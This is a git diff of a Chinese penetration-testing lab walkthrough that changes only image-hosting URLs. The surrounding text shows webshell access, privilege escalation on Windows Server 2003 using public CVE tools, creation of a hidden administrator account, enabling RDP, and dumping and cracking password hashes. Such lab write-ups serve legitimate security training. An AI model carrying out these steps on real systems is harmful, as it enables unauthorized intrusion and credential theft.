-![chopper_trojan](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/chopper_trojan.png)
+![chopper_trojan](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/chopper_trojan.png)
 
 双击 shell 记录，成功连接网站的文件管理系统：
 
-![chopper_file_manager](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/chopper_file_manager.png)
+![chopper_file_manager](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/chopper_file_manager.png)
 
 最后回到题目，根据选项提示，成功验证了能够通过 **写入配置文件** 获得 webshell：
 
@@ -315,39 +315,39 @@ SQL 语句中限制条件为 `WHERE id=1 AND 1=2# `，相当于 `WHERE 1=2# `，
 
 首先将工具箱【提权工具】->【windows】目录中的三款工具，在菜刀的文件管理页面空白处，右键点击 **上传文件** 至服务器 `C:\wmpub` 目录下，接着右击 cmd.exe，选择 **虚拟终端** 进入到命令行交互界面：
 
-![chopper_upload](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/chopper_upload.png)
+![chopper_upload](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/chopper_upload.png)
 
 输入 `systeminfo` 命令，获取服务器系统相关信息，得知系统为 Microsoft Windows Server 2003 Enterprise Edition SP2，且只安装了一个补丁程序，即可猜测该系统存在 CVE-2009-0079 漏洞：
 
-![systeminfo](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/systeminfo.png)
+![systeminfo](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/systeminfo.png)
 
 接着切换到 `C:\wmpub` 目录，输入 `churrasco "net user ichunqiu key /add"` 命令，添加一个名为 `ichunqiu`、密码为 `key` 的用户：
 
-![churrasco_user](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/churrasco_user.png)
+![churrasco_user](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/churrasco_user.png)
 
 再输入 `churrasco "net localgroup administrators ichunqiu /add"`命令，将 `ichunqiu` 用户添加到 `administrators` 用户组：
 
-![churrasco_localgroup](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/churrasco_localgroup.png)
+![churrasco_localgroup](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/churrasco_localgroup.png)
 
 > 小贴士：可通过 `net user` 与 `net localgroup administrators` 查看命令是否执行成功。
 
 最后输入 `churrasco 3389` 命令，打开 3389 端口及远程桌面服务：
 
-![churrasco_3389](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/churrasco_3389.png)
+![churrasco_3389](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/churrasco_3389.png)
 
 确认提权成功后，在本机上点击 **开始 -> 运行**，输入 [`mstsc`](https://baike.baidu.com/item/mstsc)，远程计算机地址为 `172.16.12.2`（在实验场景拓扑图上可见）：
 
-![mstsc](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/mstsc.png)
+![mstsc](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/mstsc.png)
 
 正常的话会弹出远程桌面，输入用户名 `ichunqiu` 与密码 `key`，即可成功登录远程服务器：
 
-![login_server](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/login_server.png)
+![login_server](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/login_server.png)
 
 ## pr.exe 提权
 
 **pr.exe** 也是 CVE-2009-0079 漏洞的提权工具，位于【提权工具】->【windows】目录下，使用方法与 Churrasco.exe 类似。不过注意的是，在第一次执行创建用户命令时，可能会报错，若创建失败，只需再次执行即可：
 
-![pr](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/pr.png)
+![pr](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/pr.png)
 
 ## iis.exe 提权
 
@@ -355,7 +355,7 @@ SQL 语句中限制条件为 `WHERE id=1 AND 1=2# `，相当于 `WHERE 1=2# `，
 
 > 小贴士：CVE-2009-1535 是 IIS 5.1 和 6.0 中 [WebDAV](https://baike.baidu.com/item/WebDAV) 扩展的身份验证绕过漏洞，收录于 Microsoft 安全公告 [MS09-020](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-020)，影响 **Microsoft Windows Server 2003 SP2 中 Internet Information Services 6.0** 等多个系统版本。
 
-![iis](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/iis.png)
+![iis](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/iis.png)
 
 # 0x06 获取管理员系统密码
 
@@ -369,7 +369,7 @@ SQL 语句中限制条件为 `WHERE id=1 AND 1=2# `，相当于 `WHERE 1=2# `，
 
 使用之前，将实验工具箱【提权工具】->【hash】->【Pwdump7】文件夹下的 **Pwdump7.exe** 与 **libeay32.dll** 两个文件通过菜刀上传至服务器 `C:\wmpub` 目录，再回到远程主机桌面点击【开始】 -> 【我的电脑】，进入上传点打开 cmd.exe，直接输入 `pwdump7` 命令即可获得所有用户的密码哈希值，其中 `62C4700EBB05958F3832C92FC614B7D1` 是 LM 哈希，`4D478675344541AACCF6CF33E1DD9D85` 是 NTLM 哈希：
 
-![pwdump7](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/pwdump7.png)
+![pwdump7](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/pwdump7.png)
 
 ## QuarksPwDump
 
@@ -377,17 +377,17 @@ SQL 语句中限制条件为 `WHERE id=1 AND 1=2# `，相当于 `WHERE 1=2# `，
 
 使用前，同样先将【提权工具】->【hash】->【QuarksPwDump_v0.1】文件夹下的 **QuarksPwDump.exe** 上传至服务器 `C:\wmpub` 目录，在远程主机上传点打开 cmd.exe，直接输入 `quarkspwdump` 命令：
 
-![quarkspwdump_cmd](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/quarkspwdump_cmd.png)
+![quarkspwdump_cmd](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/quarkspwdump_cmd.png)
 
 命令成功执行后，进入到 QuarksPwDump.exe 命令交互界面，再输入 `quarkspwdump --dump-hash-local` 命令：
 
 > 小贴士：对命令选项熟悉后，可直接在 cmd 命令交互界面中输入 `quarkspwdump --dump-hash-local` 命令。
 
-![quarkspwdump_input](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/quarkspwdump_input.png)
+![quarkspwdump_input](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/quarkspwdump_input.png)
 
 界面刷新，并导出本地用户的密码哈希值：
 
-![quarkspwdump_result](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/quarkspwdump_result.png)
+![quarkspwdump_result](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/quarkspwdump_result.png)
 
 ## Cain & Abel
 
@@ -397,15 +397,15 @@ SQL 语句中限制条件为 `WHERE id=1 AND 1=2# `，相当于 `WHERE 1=2# `，
 
 > 小贴士：比起前两款工具，Cain & Abel 使用前需要安装，并且操作步骤相对繁琐，增大了在目标系统留下痕迹的可能，因此建议在满足需求的情况下，尽量选用小巧便捷的工具。
 
-![cain_install](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/cain_install.png)
+![cain_install](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/cain_install.png)
 
 全部安装完毕后点击桌面上的 **Cain**，在 **Cracker** 选项卡下选中 **LM & NTLM Hashes**，点击 **Add to list（即蓝色加号）**，勾选上 **Include Password History Hashes** ：
 
-![cain_config](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/cain_config.png)
+![cain_config](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/cain_config.png)
 
 点击 **Next** 后即能获取到所有本地用户的密码哈希值：
 
-![cain_result](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/cain_result.png)
+![cain_result](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/cain_result.png)
 
 ## Online Hash Crack
 
@@ -413,7 +413,7 @@ SQL 语句中限制条件为 `WHERE id=1 AND 1=2# `，相当于 `WHERE 1=2# `，
 
 在主页点击 **OPHCRACK** 选项卡，将 NTLM 哈希 `4D478675344541AACCF6CF33E1DD9D85` 填入第一个文本框，点击 **GO** 解密后，即得管理员系统密码的明文 `cu9e2cgw`：
 
-![objectif](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/objectif.png)
+![objectif](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/objectif.png)
 
 # 0x07 小结
 
